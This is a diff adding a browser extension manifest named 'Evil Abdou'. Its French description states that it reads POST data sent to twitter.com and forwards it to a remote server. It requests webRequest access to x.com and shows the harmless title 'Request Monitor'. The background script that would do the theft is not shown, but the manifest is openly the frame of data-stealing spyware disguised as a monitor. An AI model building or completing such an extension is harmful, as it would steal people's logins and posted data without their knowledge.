@@ -1,0 +1,18 @@
+{
+  "name": "Evil Abdou",
+  "description": "lis les donnees POST qui vont vers twitter.com et les envoies a un serveur distant.",
+  "version": "1.0.0",
+  "manifest_version": 3,
+  "permissions": ["webRequest", "storage"],
+  "host_permissions": [
+  "*://x.com/*",
+  "*://*.x.com/*"
+],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_title": "Request Monitor",
+    "default_popup": "popup.html"
+  }
+}
